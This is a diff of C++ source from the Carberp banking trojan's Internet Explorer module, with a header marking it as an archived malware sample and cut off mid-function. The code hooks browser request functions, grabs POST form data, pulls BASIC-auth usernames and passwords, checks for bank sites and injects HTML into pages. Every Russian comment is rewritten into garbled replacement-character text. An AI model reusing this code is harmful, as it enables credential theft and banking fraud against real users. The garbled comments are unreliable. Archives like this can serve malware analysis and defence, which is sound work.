@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <wininet.h>
 #include <urlmon.h>
@@ -24,7 +35,7 @@
 
 //#include "BotDebug.h"
 
-// все функции которые мы будем хучить для IE
+// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ IE
 typedef BOOL(WINAPI * FUNC_HttpSendRequestA)
 (HINTERNET hRequest, LPCTSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional,
 	DWORD dwOptionalLength);
@@ -119,7 +130,7 @@ FUNC_InternetConnect REAL_InternetConnectW;
 FUNC_InternetWriteFile REAL_InternetWriteFile;
 
 
-// Шаблон вывода отладочного сообщения InternetExplorer
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ InternetExplorer
 template<class REQUEST, class DATA, class STR_>void IEDBG_Template
 (REQUEST Request, DATA Data, STR_ Str) {
 #ifdef DebugUtils
@@ -152,14 +163,14 @@ template<class STR>void IEDBG_Template(STR Str) {
 HWND WINAPI Hook_CreateWindowExA(DWORD dwExStyle, LPCSTR lpClassName,
 	LPCSTR lpWindowName, DWORD dwStyle, int x, int y, int nWidth, int nHeight,
 	HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam) {
-	// Назначение хука не понятно
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	HWND hWnd = Real_CreateWindowExA(dwExStyle, lpClassName, lpWindowName,
 		dwStyle, x, y, nWidth, nHeight, hWndParent, hMenu, hInstance, lpParam);
 
 	return hWnd;
 }
 
-/* Предварительное объявление функция */
+/* пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ */
 DWORD WINAPI ReadDataProc(PRequest Request);
 void SetCallbackMethod(PRequest Request, INTERNET_STATUS_CALLBACK Method);
 void RestoreCallbackMethod(PRequest Request);
@@ -167,18 +178,18 @@ void FreeIRRequestData(LPVOID Request);
 
 /* ---------------------------------------------------------------------------- */
 
-PCHAR IEUserAgent = NULL; // Юзер агент текущей версии Интернет експлорера
+PCHAR IEUserAgent = NULL; // пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
-PRequestList Requests; // Глобальный список запросов
+PRequestList Requests; // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 void InitIEGlobalData() {
-	// Инициализируем данные необходимые для обработки запросов Internet Explorer
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Internet Explorer
 	Requests = Request::CreateList(NULL, FreeIRRequestData);
 	IEUserAgent = NULL;
 }
 
 void FreeIRRequestData(LPVOID Request) {
-	// При удалении запроса восстанавливаем методы обратной связи
+	// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	RestoreCallbackMethod((PRequest)Request);
 }
 
@@ -196,15 +207,15 @@ bool DoInjectIE(PRequest Request)
 
 	Request::CloseReceiveData(Request);
 
-	// Инициализируем информацию о сессии
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	Request->Injected = true;
 
 
 	if (List::Count(Request->Injects) == 0)
     	return false;
 
-	// Обрабатываем загруженные данные
-	//IEDBG(Request, Request->Buffer, "--->> Выполняем HTML инжекты");
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	//IEDBG(Request, Request->Buffer, "--->> пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTML пїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 
 	THTTPSessionInfo Session;
 
@@ -227,7 +238,7 @@ bool DoInjectIE(PRequest Request)
 
 PCHAR GetInetOption(HINTERNET Handle, DWORD Option)
 {
-	// Получить значение для интернет сессии
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Handle == NULL)
 		return NULL;
 	PCHAR Result = NULL;
@@ -246,7 +257,7 @@ PCHAR GetInetOption(HINTERNET Handle, DWORD Option)
 
 PCHAR GetHTTPInfo(HINTERNET Handle, DWORD Option)
 {
-	// Получить значение для интернет сессии
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Handle == NULL)
 		return NULL;
 	PCHAR Result = NULL;
@@ -263,7 +274,7 @@ PCHAR GetHTTPInfo(HINTERNET Handle, DWORD Option)
 // ---------------------------------------------------------------------------
 
 void UpdateIEUserAgent(HINTERNET Handle) {
-	// Получить имя агента
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (IEUserAgent != NULL)
 		return;
 
@@ -281,12 +292,12 @@ void UpdateIEUserAgent(HINTERNET Handle) {
 
 void WINAPI FORMGrabber(PRequest Request)
 {
-	// Метод грабит POST данные
+	// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ POST пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if (Request->Method != hmPOST || Request->Optional == NULL)
 		return;
 
-	// Проверяем тип отправляемых данных
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	PCHAR ContentType = GetHTTPInfo((HINTERNET)Request->Owner,
 		HTTP_QUERY_CONTENT_TYPE | HTTP_QUERY_FLAG_REQUEST_HEADERS);
@@ -299,17 +310,17 @@ void WINAPI FORMGrabber(PRequest Request)
 	}
 	STR::Free(ContentType);
 
-	// Получаем имя агента
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	UpdateIEUserAgent((HINTERNET)Request->Owner);
 
-	// Отправляем данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	DataGrabber::AddHTMLFormData(Request->URL, Request->Optional, IEUserAgent,
 		BROWSER_TYPE_IE, DATA_TYPE_FORM);
 }
 // ---------------------------------------------------------------------------
 
 //void AddCacheFileNameMask(PCHAR URL, PCHAR ContentType) {
-//	// Функция генерирует ожидаемую маску файла кеша
+//	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 //	bool CheckExtension = false;
 //
 //	if (ContentType != NULL)
@@ -325,7 +336,7 @@ void WINAPI FORMGrabber(PRequest Request)
 //		if (End != NULL)
 //			Len = End - ContentType;
 //
-//		// Проверяем нужно ли нам обрабатывать документ
+//		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //		DWORD Hash = STR::GetHash(ContentType, Len, true);
 //		bool Support = false;
 //		for (int i = 0; Hashes[i] != 0; i++) {
@@ -342,7 +353,7 @@ void WINAPI FORMGrabber(PRequest Request)
 //	else
 //		CheckExtension = true;
 //
-//	// Определяем маску файла
+//	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 //
 //	PCHAR FileName = File::ExtractFileNameA(URL, true);
 //	PCHAR ExtPos = STR::Scan(FileName, '.');
@@ -373,12 +384,12 @@ PRequest HttpPreSendRequest(HINTERNET Handle, LPVOID Optional,
 	DWORD OptionalLength, bool &CancelRequest)
 {
 
-	// Обрабатываем запрос
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Handle == NULL)
 		return NULL;
 
 
-	// Обрабатываем только GET и POST методы
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ GET пїЅ POST пїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR Method = GetHTTPInfo(Handle, HTTP_QUERY_REQUEST_METHOD);
 	if (Method == NULL)
 		return NULL;
@@ -389,7 +400,7 @@ PRequest HttpPreSendRequest(HINTERNET Handle, LPVOID Optional,
 	if (MID != hmGET && MID != hmPOST)
 		return NULL;
 
-	// Добавляем новый запрос
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PRequest Request = Request::Add(Requests, Handle, NULL);
 	if (Request == NULL)
 		return NULL;
@@ -397,10 +408,10 @@ PRequest HttpPreSendRequest(HINTERNET Handle, LPVOID Optional,
 	Request->URL = GetInetOption(Handle, INTERNET_OPTION_URL);
 	Request->Method = MID;
 
-	IEDBG(Request, NULL, "Перехватываем запрос на %s", Request->URL);
+	IEDBG(Request, NULL, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ %s", Request->URL);
 
 
-	// Обрабатываем взаимодействие со скриптами инжектов
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	ProcessHTMLInjectRequest(Request->URL, false, &CancelRequest);
 	if (CancelRequest)
 		return Request;
@@ -414,7 +425,7 @@ PRequest HttpPreSendRequest(HINTERNET Handle, LPVOID Optional,
 		CheckJavaClient2015File(Request->URL);
 	#endif
 
-	// При необходимости отправляем GET данные
+	// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ GET пїЅпїЅпїЅпїЅпїЅпїЅ
 	#ifdef GETDataGrabberH
 		if (MID == hmGET)
 		{
@@ -424,12 +435,12 @@ PRequest HttpPreSendRequest(HINTERNET Handle, LPVOID Optional,
 	#endif
 
 
-	// Отправляем POST данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ POST пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if (Optional != NULL && OptionalLength > 0 &&
 		OptionalLength <= MAX_FORM_GRABBER_DATA_SIZE)
 	{
-		IEDBG(Request, (PCHAR)Optional, "Перехватываем POST данные");
+		IEDBG(Request, (PCHAR)Optional, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ POST пїЅпїЅпїЅпїЅпїЅпїЅ");
 		Request->Optional = STR::New((PCHAR)Optional, OptionalLength);
 		FORMGrabber(Request);
 	}
@@ -439,7 +450,7 @@ PRequest HttpPreSendRequest(HINTERNET Handle, LPVOID Optional,
 
 	if (Request->IsInject)
 	{
-		IEDBG(Request, NULL, "Страница содержит инжекты. %s", Request->URL);
+		IEDBG(Request, NULL, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ. %s", Request->URL);
 
 		//AddCacheFileNameMask(Request->URL, NULL);
 
@@ -453,7 +464,7 @@ PRequest HttpPreSendRequest(HINTERNET Handle, LPVOID Optional,
 		// pHttpAddRequestHeadersA(Handle, (LPCTSTR)"TE:\r\n", -1, HTTP_ADDREQ_FLAG_REPLACE );
 	}
 #endif
-	IEDBG(Request, NULL, "Запрос успешно обработан");
+	IEDBG(Request, NULL, "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 
 
 	#ifdef BssSendFileH
@@ -461,7 +472,7 @@ PRequest HttpPreSendRequest(HINTERNET Handle, LPVOID Optional,
 			Request->IsInject = IsBSSDocument(Request->URL);
 	#endif
 
-	// Обрабатываем дополнительные модули
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 #ifdef HunterH
 	URLHunter::CheckURL(Request->URL);
 #endif
@@ -475,7 +486,7 @@ BOOL WINAPI HttpSendRequestHandler(BOOL bType, HINTERNET hRequest,
 	LPBYTE lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional,
 	DWORD dwOptionalLength)
 {
-	// Получаем Информацию о запросе
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 #ifdef RuBnkH
 	IsBank(hRequest);
@@ -492,11 +503,11 @@ BOOL WINAPI HttpSendRequestHandler(BOOL bType, HINTERNET hRequest,
 			dwHeadersLength, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
 	}
 
-	// Обрабатываем запрос
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
     bool CancelRequest = false;
 	HttpPreSendRequest(hRequest, lpOptional, dwOptionalLength, CancelRequest);
 
-	// Вызываем оригинальный метод запроса
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	BOOL ret = -1;
 
@@ -555,7 +566,7 @@ BOOL WINAPI HttpSendRequestExHandler(BOOL bType, HINTERNET hRequest,
 
 void CallISC(HINTERNET hInternet, DWORD_PTR dwContext, DWORD dwInternetStatus,
 	LPVOID lpvStatusInformation, DWORD dwStatusInformationLength) {
-	// Вызываем метод обратной связи
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
 	INTERNET_STATUS_CALLBACK isc = NULL;
 	DWORD s = sizeof(INTERNET_STATUS_CALLBACK);
@@ -586,9 +597,9 @@ void CallISC(HINTERNET hInternet, DWORD_PTR dwContext, DWORD dwInternetStatus,
 
 void CheckBASICAuthorization(PRequest Request)
 {
-	// Метод проверяет наличие в запросе информации о BASIC авторизации
+	// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ BASIC пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
-	// Получаем имя пользователя
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR User = GetInetOption((HINTERNET)Request->Owner,
 		INTERNET_OPTION_USERNAME);
 	if (STR::IsEmpty(User))
@@ -596,7 +607,7 @@ void CheckBASICAuthorization(PRequest Request)
 	PCHAR Password = GetInetOption((HINTERNET)Request->Owner,
 		INTERNET_OPTION_PASSWORD);
 
-	// Отправляем данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	THTTPSessionInfo Session;
 	Session.BrowserType = BROWSER_TYPE_IE;
 	Session.URL = Request->URL;
@@ -613,7 +624,7 @@ void CallPreviosStatusCallback(INTERNET_STATUS_CALLBACK CallBack,
 	HINTERNET Internet, DWORD_PTR Content, DWORD dwInternetStatus,
 	LPVOID lpvStatusInformation, DWORD dwStatusInformationLength)
 {
-	// Вызываем сохранённый метод оьратной связи
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (CallBack != NULL)
 		CallBack(Internet, Content, dwInternetStatus, lpvStatusInformation,
 		dwStatusInformationLength);
@@ -624,7 +635,7 @@ void CALLBACK InternetStatusCallback(HINTERNET hInternet, DWORD_PTR dwContext,
 	DWORD dwInternetStatus, LPVOID lpvStatusInformation,
 	DWORD dwStatusInformationLength)
 {
-	// Обрабатываем уведомление обратной связи об изменении статуса интернета
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	PRequest Request = (PRequest)dwContext;
 
@@ -639,17 +650,17 @@ void CALLBACK InternetStatusCallback(HINTERNET hInternet, DWORD_PTR dwContext,
 // -----------------------------------------------------------------------------
 
 void SetCallbackMethod(PRequest Request, INTERNET_STATUS_CALLBACK Method) {
-	// Усьанавливаем метод обратной связи
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
 	RestoreCallbackMethod(Request);
 
 	DWORD Size = sizeof(DWORD_PTR);
 
-	// Сохраняем старые данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	pInternetQueryOptionA((HINTERNET)Request->Owner,
 		INTERNET_OPTION_CONTEXT_VALUE, &Request->OldContext, &Size);
 
-	// Устанавливаем свои данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	Request->OldCallback = pInternetSetStatusCallback((HINTERNET)Request->Owner, Method);
 
 	pInternetSetOptionA((HINTERNET)Request->Owner,
@@ -660,7 +671,7 @@ void SetCallbackMethod(PRequest Request, INTERNET_STATUS_CALLBACK Method) {
 
 void RestoreCallbackMethod(PRequest Request)
 {
-	// Восстанавливаем событие обратной связи
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (Request != NULL && Request->OldCallback != NULL) {
 		pInternetSetOptionA(Request->Owner, INTERNET_OPTION_CONTEXT_VALUE,
 			&Request->OldContext, sizeof(DWORD_PTR));
@@ -674,9 +685,9 @@ void RestoreCallbackMethod(PRequest Request)
 
 void WaitCallbackEvent(PRequest Request)
 {
-	// Ожидаем события обратной связи
-	// Метод организовывает цикл обработки сообщений дл возникновения
-	// События Event
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ Event
 	MSG Msg;
 	do
 	{
@@ -693,8 +704,8 @@ void WaitCallbackEvent(PRequest Request)
 
 void AddPageToCashe(PRequest Request)
 {
-	// В случае изменения                                                                                                                          нных и включенном кешировании в настройках
-	// обозревателя кешируем загруженные данные
+	// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ                                                                                                                          пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if (Request == NULL || STR::IsEmpty(Request->URL)
 		|| !Request->DocumentNeedCached)
@@ -724,8 +735,8 @@ void AddPageToCashe(PRequest Request)
 /*
 void AddPageToCashe(PRequest Request)
 {
-//  В случае изменения                                                                                                                          нных и включенном кешировании в настройках
-//  обозревателя кешируем загруженные данные
+//  пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ                                                                                                                          пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 const DWORD dwUrlSize = 1024;
 WCHAR lpUrl[dwUrlSize];
 
@@ -760,16 +771,16 @@ DWORD WINAPI ReadDataProc(PRequest Request)
 
 	if (Request->Entry == 0 || Request->Entry == MAXDWORD)
 	{
-		// Загрузка проводится во временный буфер, инициализируем его
-		IEDBG(Request, NULL, "Загружаем документ");
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+		IEDBG(Request, NULL, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 
 		Request->Event = pCreateEventW(NULL, TRUE, FALSE, NULL);
 
-		// Устанавливаем метод обратной связи
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		SetCallbackMethod(Request, InternetStatusCallback);
 	}
 
-	// Инициализируем буфер приёма
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	Request::InitializeReceiveData(Request);
 
 	PMemBlockList List = Request->ReceiveList;
@@ -782,7 +793,7 @@ DWORD WINAPI ReadDataProc(PRequest Request)
 	IB.dwStructSize = sizeof(INTERNET_BUFFERSA);
 	IB.lpvBuffer = (LPBYTE)Request->ReceiveBuf->Data;
 
-	// Запускаем цикл загрузки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	for (; ; )
 	{
 		IB.dwBufferLength = Request->ReceiveBuf->Size;
@@ -798,7 +809,7 @@ DWORD WINAPI ReadDataProc(PRequest Request)
 					return 0;
 				}
 
-				// Ожидаем события обратной связи
+				// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 				WaitCallbackEvent(Request);
 				continue;
 			}
@@ -809,7 +820,7 @@ DWORD WINAPI ReadDataProc(PRequest Request)
 
 		dwLastError = ERROR_SUCCESS;
 
-		// Если Все данные загружены то прерываем цикл
+		// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		if (IB.dwBufferLength == 0) break;
 
 
@@ -820,25 +831,25 @@ DWORD WINAPI ReadDataProc(PRequest Request)
     Request::CloseReceiveData(Request);
 
 #ifdef HTMLInjectsH
-	// Обрабатываем загруженные данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (r )
 	{
 		DoInjectIE(Request);
 	}
 #endif
 
-	// освобождаем использованные ресурсы
